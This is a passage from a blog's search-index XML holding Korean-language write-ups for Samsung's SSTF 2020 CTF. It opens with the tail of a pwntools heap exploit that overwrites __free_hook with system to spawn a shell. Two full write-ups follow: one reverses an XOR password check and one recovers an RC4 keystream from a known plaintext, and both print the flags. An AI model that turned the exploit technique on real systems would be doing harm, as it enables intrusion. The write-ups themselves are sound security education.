class="hljs-string">&#x27;1&#x27;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png"></p><p>64bit elf 파일임을 알 수 있습니다. Ubuntu 20.04 64bit에서 실행을 해보겠습니다.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png"></p><p>Password를 입력하고 정상적인 패스워드를 입력했을 시 플래그가 나오는 형식으로 생각할 수 있습니다.</p><p>Ghidra를 사용하여 crackme101이 어떤 식으로 구동되는지 확인해보도록 하겠습니다.</p><h1 id="crackme101-분석"><a href="#crackme101-분석" class="headerlink" title="crackme101 분석"></a>crackme101 분석</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  &#123;    local_88 = local_88 + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">if</span> (local_88 != iVar1) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>입력된 패스워드는 <code>local_78</code>에 들어가게 되고 <code>iVar1</code>는 입력한 패스워드의 길이가 됩니다.</p><p><code>getMaskedStr</code> 함수에서 인자를 모두 <code>local_78</code>로 받아서 어떠한 작업을 수행한 후 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;” 문자열과 <code>ocal_78</code> 문자열을 뒷부분의 배열부터 <code>iVar1</code>의 크기만큼 비교합니다.</p><p><code>local_88</code>과 <code>iVar1</code>이 같아야 하려면 while 문의 조건인 각 문자열이 동일해야 하므로 <code>getMaskedStr</code> 함수를 통과한 <code>local_78</code>의 값이 어떠한 값인지 먼저 알아야 합니다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) &#123;    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  &#125;  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>인자로 받은 param은 입력받은 패스워드 값이 될 것입니다.</p><p>문자열의 길이만큼 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”문자열과 동일한 index끼리 xor 연산을 수행하는 것을 볼 수 있습니다.</p><p>따라서 패스워드 check가 어떠한 식으로 진행이 되는지 요약해보면</p><ol><li>패스워드를 입력을 받는다.</li><li><code>getMaskedStr</code> 함수를 통해 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9” 문자열과 동일한 인덱스끼리 xor 연산을 수행</li><li>수행한 결과를 뒤집어서 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”과 맞는지 검사</li><li>맞으면 Correct</li></ol><p>그러면 저희가 복호화할 시나리오는</p><ol><li><p>최종적으로 나올 값은 “Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;”이므로 해당 문자열과 “u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9”를 뒤집은 문자열을 xor 연산</p></li><li><p>나온 문자열을 다시 뒤집음</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png"></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png"></p><p>압축을 풀면 challenge.py와 output.txt 파일을 볼 수 있습니다.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png"></p><p>output.txt 파일에는 암호화된 것으로 추측되는 문자열이 2줄 존재합니다.</p><h1 id="challenge-py-분석"><a href="#challenge-py-분석" class="headerlink" title="challenge.py 분석"></a>challenge.py 분석</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&#x27;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge 파일을 해보면 arc4를 사용하여 암호화를 진행한 것을 알 수 있습니다.</p><p>output.txt의 첫 번째 줄은 msg를 암호화한 부분이고 두 번째 줄은 flag임을 알 수 있습니다.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 알고리즘</a>은 스트림 암호로 key 값을 사용하여 셔플링을 통해 키 스트림 바이트를 생성한 후 해당 키 스트림과 xor 연산을 통해 암호화를 진행합니다.</p><p>key 값을 사용하여 생성된 key stream과 문자열을 xor 연산하여 최종 암호문이 나오는 것을 활용하면 key 값을 알지 못해도 flag 암호문을 복호화할 수 있습니다.</p><p>key stream ^ 문자열 = 암호문이므로 암호문 ^ 문자열을 수행하면 key stream을 알 수 있고 해당 key stream과 flag 암호문을 xor 연산을 수행하면 flag 값을 얻을 수 있습니다.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
